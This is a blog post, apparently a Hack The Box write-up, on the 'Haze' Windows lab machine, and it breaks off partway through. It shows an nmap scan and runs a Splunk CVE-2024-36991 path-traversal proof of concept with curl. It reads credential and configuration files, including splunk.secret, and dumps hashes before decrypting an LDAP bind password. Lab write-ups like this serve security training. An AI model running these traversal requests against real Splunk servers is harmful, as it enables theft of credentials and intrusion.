@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/07/01/hackthebox/htb-haze/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HTB-Haze | Muyi&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muyi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">37</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HTB-Haze</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-01 13:01:52</span>
+        <span class="mobile">2025-07-01 13:01:52</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-17 13:10:28</span>
+            <span class="mobile">2025-08-17 13:10:28</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hard/">Hard</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Windows/">Windows</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>nmap</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-03-30 10:55:00Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">8000/tcp open  http          Splunkd httpd</span><br><span class="line">8088/tcp open  ssl/http      Splunkd httpd</span><br><span class="line">8089/tcp open  ssl/http      Splunkd httpd</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>port 8000 returns a Login page for Splunk Enterprise (http)</li>
+<li>port 8088 returns empty (https)</li>
+<li>port 8089 returns Splunk build (https)<ul>
+<li>version 9.2.1 –&gt; CVE-2024-36991</li>
+</ul>
+</li>
+</ul>
+<p>POC</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/bigb0x/CVE-2024-36991" >https://github.com/bigb0x/CVE-2024-36991<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/CVE-2024-36991$ python3 CVE-2024-36991.py -u http://haze.htb:8000</span><br><span class="line">/home/muyi/Desktop/htb/machines/haze~10.10.11.61/CVE-2024-36991/CVE-2024-36991.py:53: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\ &#x27;</span></span><br><span class="line">  <span class="string">&quot;&quot;</span><span class="string">&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _</span></span><br><span class="line"><span class="string"> / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |</span></span><br><span class="line"><span class="string">| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| &#x27;_ | (_) | (_) | |</span></span><br><span class="line"><span class="string">| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |</span></span><br><span class="line"><span class="string"> \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt; POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file.</span></span><br><span class="line"><span class="string">-&gt; By x.com/MohamedNab1l</span></span><br><span class="line"><span class="string">-&gt; Use Wisely.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[INFO] Testing single target: http://haze.htb:8000</span></span><br><span class="line"><span class="string">[VLUN] Vulnerable: http://haze.htb:8000</span></span><br><span class="line"><span class="string">:admin:$6<span class="variable">$Ak3m7</span>.aHgb/NOQez<span class="variable">$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1</span>::Administrator:admin:changeme@example.com:::20152</span></span><br><span class="line"><span class="string">:edward:$6$3LQHFzfmlpMgxY57<span class="variable">$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22</span>/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152</span></span><br><span class="line"><span class="string">:mark:$6<span class="variable">$j4QsAJiV8mLg</span>/bhA<span class="variable">$Oa</span>/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152</span></span><br><span class="line"><span class="string">:paul:$6$Y5ds8NjDLd7SzOTW<span class="variable">$Zg</span>/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152</span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<p>the hashes were uncrackable, but still there are some fruitful discoveries:</p>
+<ul>
+<li>4 user –&gt; admin, edward, mark, paul</li>
+<li>the POC which allows arbitrary file read works<ul>
+<li>can use to read other files</li>
+</ul>
+</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/CVE-2024-36991$ curl http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Windows/System32/drivers/etc/hosts</span><br><span class="line"><span class="comment"># Copyright (c) 1993-2009 Microsoft Corp.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This file contains the mappings of IP addresses to host names. Each</span></span><br><span class="line"><span class="comment"># entry should be kept on an individual line. The IP address should</span></span><br><span class="line"><span class="comment"># be placed in the first column followed by the corresponding host name.</span></span><br><span class="line"><span class="comment"># The IP address and the host name should be separated by at least one</span></span><br><span class="line"><span class="comment"># space.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Additionally, comments (such as these) may be inserted on individual</span></span><br><span class="line"><span class="comment"># lines or following the machine name denoted by a &#x27;#&#x27; symbol.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For example:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#      102.54.94.97     rhino.acme.com          # source server</span></span><br><span class="line"><span class="comment">#       38.25.63.10     x.acme.com              # x client host</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># localhost name resolution is handled within DNS itself.</span></span><br><span class="line"><span class="comment">#       127.0.0.1       localhost</span></span><br><span class="line"><span class="comment">#       ::1             localhost</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rabbit hole</span></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/CVE-2024-36991$ curl http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/system/local/server.conf</span><br><span class="line">[general]</span><br><span class="line">serverName = dc01</span><br><span class="line">pass4SymmKey = $7<span class="variable">$lPCemQk01ejJvI8nwCjXjx7PJclrQJ</span>+SfC3/ST+K0s+1LsdlNuXwlA== //after decrypt returns <span class="string">&quot;changeme&quot;</span></span><br><span class="line"></span><br><span class="line">[sslConfig]</span><br><span class="line">sslPassword = $7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw== //after decrypt returns <span class="string">&quot;password&quot;</span></span><br><span class="line"></span><br><span class="line">[lmpool:auto_generated_pool_download-trial]</span><br><span class="line">description = auto_generated_pool_download-trial</span><br><span class="line">peers = *</span><br><span class="line">quota = MAX</span><br><span class="line">stack_id = download-trial</span><br><span class="line"></span><br><span class="line">[lmpool:auto_generated_pool_forwarder]</span><br><span class="line">description = auto_generated_pool_forwarder</span><br><span class="line">peers = *</span><br><span class="line">quota = MAX</span><br><span class="line">stack_id = forwarder</span><br><span class="line"></span><br><span class="line">[lmpool:auto_generated_pool_free]</span><br><span class="line">description = auto_generated_pool_free</span><br><span class="line">peers = *</span><br><span class="line">quota = MAX</span><br><span class="line">stack_id = free</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/CVE-2024-36991$ curl http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/auth/splunk.secret</span><br><span class="line">NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/CVE-2024-36991$ curl http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf</span><br><span class="line">[splunk_auth]</span><br><span class="line">minPasswordLength = 8</span><br><span class="line">minPasswordUppercase = 0</span><br><span class="line">minPasswordLowercase = 0</span><br><span class="line">minPasswordSpecial = 0</span><br><span class="line">minPasswordDigit = 0</span><br><span class="line"></span><br><span class="line">[Haze LDAP Auth]</span><br><span class="line">SSLEnabled = 0</span><br><span class="line">anonymous_referrals = 1</span><br><span class="line">bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb</span><br><span class="line">bindDNpassword = $7<span class="variable">$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN</span>+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=</span><br><span class="line">charset = utf8</span><br><span class="line">emailAttribute = mail</span><br><span class="line">enableRangeRetrieval = 0</span><br><span class="line">groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb</span><br><span class="line">groupMappingAttribute = dn</span><br><span class="line">groupMemberAttribute = member</span><br><span class="line">groupNameAttribute = cn</span><br><span class="line">host = dc01.haze.htb</span><br><span class="line">nestedGroups = 0</span><br><span class="line">network_timeout = 20</span><br><span class="line">pagelimit = -1</span><br><span class="line">port = 389</span><br><span class="line">realNameAttribute = cn</span><br><span class="line">sizelimit = 1000</span><br><span class="line">timelimit = 15</span><br><span class="line">userBaseDN = CN=Users,DC=haze,DC=htb</span><br><span class="line">userNameAttribute = samaccountname</span><br><span class="line"></span><br><span class="line">[authentication]</span><br><span class="line">authSettings = Haze LDAP Auth</span><br><span class="line">authType = LDAP</span><br></pre></td></tr></table></figure></div>
+
+<p>Cracking Splunk Hash</p>
+<ul>
+<li>get <em>splunksecrets</em> via <strong>pip3 install splunksecrets</strong></li>
+<li>save the splunk secret via arbitrary file read into a txt file, here i name it “splunksecret”<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/CVE-2024-36991$ splunksecrets splunk-decrypt -S splunksecret</span><br><span class="line">Ciphertext: $7<span class="variable">$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN</span>+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=</span><br><span class="line">Ld@p_Auth_Sp1unk@2k24</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<p>Verifying username + password</p>
